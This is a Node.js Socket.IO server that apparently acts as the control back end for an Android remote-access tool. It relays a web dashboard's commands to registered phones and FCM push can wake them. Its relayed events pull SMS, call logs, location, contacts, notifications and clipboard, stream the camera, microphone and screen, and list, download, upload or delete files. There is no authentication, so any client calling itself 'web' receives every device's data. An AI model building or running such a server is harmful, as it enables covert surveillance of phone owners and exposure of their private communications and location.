const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true
  },
  pingInterval: 25000,
  pingTimeout: 60000
});

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));

// Enable JSON body parsing for API endpoints
app.use(express.json());

// In-memory store for FCM tokens mapped by device ID
const fcmTokens = new Map();

// Endpoint for the Android app to register/update its FCM token
app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true });
});

// Endpoint for the web client dashboard to trigger a start/stop command via FCM
app.post('/api/fcm/send', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'Missing deviceId or command' });
  }

  const token = fcmTokens.get(deviceId);
  if (!token) {
    return res.status(404).json({ error: 'No FCM token registered for this device' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
  
  // NOTE: In a production environment, you would use the 'firebase-admin' SDK here.
  // We'll write the sending logic using a standard fetch to the FCM legacy API 
  // or HTTP v1 API. Since the user might be using legacy keys or a service account:
  // For dual-use flexibility, we log it and attempt legacy API if a key exists,
  // otherwise we stub it with a clear diagnostic log.
  const serverKey = process.env.FIREBASE_SERVER_KEY;
  if (!serverKey) {
    console.warn('[FCM] FIREBASE_SERVER_KEY env var not set. Cannot send real push.');
    return res.status(501).json({ 
      error: 'Firebase Server Key not configured on server. Check FIREBASE_SERVER_KEY.', 
      token: token 
    });
  }

  try {
    const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
    const response = await fetch('https://fcm.googleapis.com/fcm/send', {
      method: 'POST',
      headers: {
        'Authorization': `key=${serverKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: token,
        data: { command: command }
      })
    });
    const result = await response.json();
    console.log('[FCM] Push result:', result);
    res.json({ success: true, result });
  } catch (e) {
    console.error('[FCM] Push failed:', e);
    res.status(500).json({ error: e.message });
  }
});

app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

let webClients = new Set();
let deviceSockets = new Map(); // deviceId -> socket.id
let socketToDevice = new Map(); // socket.id -> deviceId
let devices = new Map(); // deviceId -> { id, deviceId, socketId, model, manufacturer, connected }
let disconnectGraceTimers = new Map(); // deviceId -> setTimeout handle

function resolveTargetSocket(targetId) {
  if (!targetId) return null;
  // 1. Direct match on socket.id
  let s = io.sockets.sockets.get(targetId);
  if (s && s.connected) return s;

  // 2. Lookup via physical deviceId mapping
  const sockId = deviceSockets.get(targetId);
  if (sockId) {
    s = io.sockets.sockets.get(sockId);
    if (s && s.connected) return s;
  }
  return null;
}

function pruneDeadSockets() {
  for (const [deviceId, sockId] of Array.from(deviceSockets.entries())) {
    const clientSocket = io.sockets.sockets.get(sockId);
    if (!clientSocket || !clientSocket.connected) {
      if (!disconnectGraceTimers.has(deviceId)) {
        console.log(`[PRUNE] Stale socket ${sockId} for device ${deviceId} detected`);
      }
    }
  }
  for (const webId of Array.from(webClients)) {
    const clientSocket = io.sockets.sockets.get(webId);
    if (!clientSocket || !clientSocket.connected) {
      webClients.delete(webId);
    }
  }
}

io.on('connection', socket => {
  console.log(`Client connected: ${socket.id} from ${socket.handshake.address}`);
  socket.emit('id', socket.id);

  socket.on('identify', (data) => {
    pruneDeadSockets();
    const type = (typeof data === 'object' && data !== null) ? data.type : data;
    console.log(`Client ${socket.id} identified as:`, type);

    if (type === 'web') {
      webClients.add(socket.id);
      devices.forEach((devMeta, deviceId) => {
        if (devMeta.connected && deviceSockets.has(deviceId)) {
          const activeSockId = deviceSockets.get(deviceId);
          console.log(`Notifying Android ${activeSockId} (${deviceId}) about web client ${socket.id}`);
          io.to(activeSockId).emit('web-client-ready', socket.id);
          io.to(socket.id).emit('android-client-ready', devMeta);
        }
      });
    } else if (type === 'android') {
      const deviceId = (typeof data === 'object' && data !== null && data.deviceId) ? data.deviceId : socket.id;
      const model = (typeof data === 'object' && data !== null && data.model) ? data.model : 'Android Device';
      const manufacturer = (typeof data === 'object' && data !== null && data.manufacturer) ? data.manufacturer : 'Android';

      // Cancel any pending disconnect grace timer for this device
      if (disconnectGraceTimers.has(deviceId)) {
        clearTimeout(disconnectGraceTimers.get(deviceId));
        disconnectGraceTimers.delete(deviceId);
        console.log(`[SERVER] Cancelled disconnect grace timer for device ${deviceId} on reconnection`);
      }

      // Check if this device already had an active socket
      const oldSocketId = deviceSockets.get(deviceId);
      if (oldSocketId && oldSocketId !== socket.id) {
        console.log(`[SERVER] Device ${deviceId} rebound from socket ${oldSocketId} to ${socket.id}`);
        socketToDevice.delete(oldSocketId);
        const oldSock = io.sockets.sockets.get(oldSocketId);
        if (oldSock) {
          try { oldSock.disconnect(true); } catch(e) {}
        }
      }

      deviceSockets.set(deviceId, socket.id);
      socketToDevice.set(socket.id, deviceId);

      const devMeta = {
        id: deviceId, // Stable primary device identifier
        deviceId: deviceId,
        socketId: socket.id,
        model: model,
        manufacturer: manufacturer,
        connected: true
      };
      devices.set(deviceId, devMeta);

      webClients.forEach(webId => {
        console.log(`Notifying Android ${socket.id} (${deviceId}) about web client ${webId}`);
        socket.emit('web-client-ready', webId);
        io.to(webId).emit('android-client-ready', devMeta);
      });
    }
    console.log(`Clients - Web: ${webClients.size}, Android Devices: ${deviceSockets.size}`);
  });

  socket.on('web-client-ready', (id) => {
    if (id !== socket.id) {
      console.warn(`Invalid web-client-ready ID: ${id}, expected: ${socket.id}`);
      return;
    }
    pruneDeadSockets();
    console.log(`Web client ${id} announced readiness`);
    webClients.add(id);
    devices.forEach((devMeta, deviceId) => {
      if (devMeta.connected && deviceSockets.has(deviceId)) {
        const activeSockId = deviceSockets.get(deviceId);
        console.log(`Notifying Android ${activeSockId} (${deviceId}) about web client ${id}`);
        io.to(activeSockId).emit('web-client-ready', id);
        io.to(id).emit('android-client-ready', devMeta);
      }
    });
  });

  socket.on('signal', data => {
    console.log(`Relaying signal from ${data.from} to ${data.to}: ${data.signal?.type || 'candidate'}`);
    if (typeof data === 'object' && data !== null) {
      if (socketToDevice.has(socket.id)) {
        data.from = socketToDevice.get(socket.id);
        data.deviceId = data.from;
      } else if (!data.from) {
        data.from = socket.id;
      }
    }
    let targetSocket = resolveTargetSocket(data.to);
    if (!targetSocket && socketToDevice.has(socket.id) && webClients.size === 1) {
      const fallbackWebId = Array.from(webClients)[0];
      const fallbackSock = io.sockets.sockets.get(fallbackWebId);
      if (fallbackSock && fallbackSock.connected) {
        targetSocket = fallbackSock;
        console.log(`Signal recipient ${data.to} redirected to active web client ${fallbackWebId}`);
      }
    }
    if (targetSocket) {
      targetSocket.emit('signal', data);
      console.log(`Signal delivered to ${data.to} via socket ${targetSocket.id}`);
    } else {
      console.warn(`Recipient ${data.to} not found for signal`);
      socket.emit('error', { message: `Recipient ${data.to} not found`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  // Relaying individual real-time streams (notification, call_log, sms, location)
  ['notification', 'call_log', 'sms', 'location'].forEach(event => {
    socket.on(event, data => {
      let targetId = null;
      let payload = data;
      if (typeof data === 'object' && data !== null) {
        if (socketToDevice.has(socket.id)) {
          data.from = socketToDevice.get(socket.id);
          data.deviceId = data.from;
        } else if (!data.from) {
          data.from = socket.id;
        }
        if (data.to) {
          targetId = data.to;
        }
      }

      const targetSocket = resolveTargetSocket(targetId);
      if (targetSocket) {
        targetSocket.emit(event, payload);
      } else {
        webClients.forEach(id => io.to(id).emit(event, payload));
      }
    });
  });

  // Generic Command & Event Relaying between Web and Android
  const relayEvents = [
    // File Explorer Events
    'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete', 
    'fs:download_start', 'fs:download_chunk', 'fs:download_complete', 
    'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
    'fs:upload_complete',
    // Remote Commands
    'cmd:ping', 'cmd:stop', 'cmd:record', 'cmd:camera_switch', 'cmd:screen_share',
    'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications', 'cmd:vibrate', 
    'cmd:toast', 'cmd:open_url', 'cmd:flashlight', 'cmd:set_volume', 
    'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
    'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
    'cmd:take_screenshot', 'cmd:open_a11y_settings',
    'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
    'cmd:stream_camera', 'cmd:stream_mic', 'cmd:stream_location', 'cmd:stream_screen',
    // Custom Data Responses
    'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
    'snapshot_data', 'screenshot_data', 'clipboard_data', 'stream_status'
  ];

  relayEvents.forEach(event => {
    socket.on(event, data => {
      let targetId = null;
      let payload = data;

      if (typeof data === 'object' && data !== null) {
        if (socketToDevice.has(socket.id)) {
          data.from = socketToDevice.get(socket.id);
          data.deviceId = data.from;
        } else if (!data.from) {
          data.from = socket.id;
        }
        if (data.to) {
          targetId = data.to;
        }
      }
      
      if (event === 'device_info' && payload) {
        const deviceId = socketToDevice.get(socket.id) || payload.deviceId || socket.id;
        const meta = devices.get(deviceId) || { id: deviceId, deviceId: deviceId, socketId: socket.id };
        if (payload.model) meta.model = payload.model;
        if (payload.manufacturer) meta.manufacturer = payload.manufacturer;
        meta.connected = true;
        devices.set(deviceId, meta);
      }

      const targetSocket = resolveTargetSocket(targetId);
      if (targetSocket) {
        targetSocket.emit(event, payload);
      } else {
        // Fallback: route based on sender type
        if (webClients.has(socket.id)) {
          deviceSockets.forEach(sockId => {
            const s = io.sockets.sockets.get(sockId);
            if (s && s.connected) s.emit(event, payload);
          });
        } else if (socketToDevice.has(socket.id)) {
          webClients.forEach(id => io.to(id).emit(event, payload));
        }
      }
    });
  });

  socket.on('disconnect', (reason) => {
    console.log(`Client disconnected: ${socket.id} (reason: ${reason})`);
    if (webClients.has(socket.id)) {
      webClients.delete(socket.id);
      deviceSockets.forEach((sockId) => {
        io.to(sockId).emit('web-client-disconnected', socket.id);
      });
    }

    if (socketToDevice.has(socket.id)) {
      const deviceId = socketToDevice.get(socket.id);
      socketToDevice.delete(socket.id);

      // Only handle if this was the current socket for the device
      if (deviceSockets.get(deviceId) === socket.id) {
        console.log(`[SERVER] Device ${deviceId} socket disconnected. Grace timer started (10s)...`);
        // Start grace period to allow brief network hiccups / socket reconnects without dropping the device from UI
        const timer = setTimeout(() => {
          disconnectGraceTimers.delete(deviceId);
          if (deviceSockets.get(deviceId) === socket.id) {
            deviceSockets.delete(deviceId);
            const meta = devices.get(deviceId);
            if (meta) meta.connected = false;
            console.log(`[SERVER] Device ${deviceId} offline after grace period.`);
            webClients.forEach(webId => {
              io.to(webId).emit('android-client-disconnected', deviceId);
            });
          }
        }, 10000);
        disconnectGraceTimers.set(deviceId, timer);
      }
    }
    console.log(`Clients - Web: ${webClients.size}, Android Devices: ${deviceSockets.size}`);
  });

  socket.on('error', (error) => {
    console.error(`Socket error from ${socket.id}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT} (accessible at http://<Your Server IP Address>:${PORT})`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  server.close(() => {
    console.log('Server shut down gracefully');
    process.exit(0);
  });
});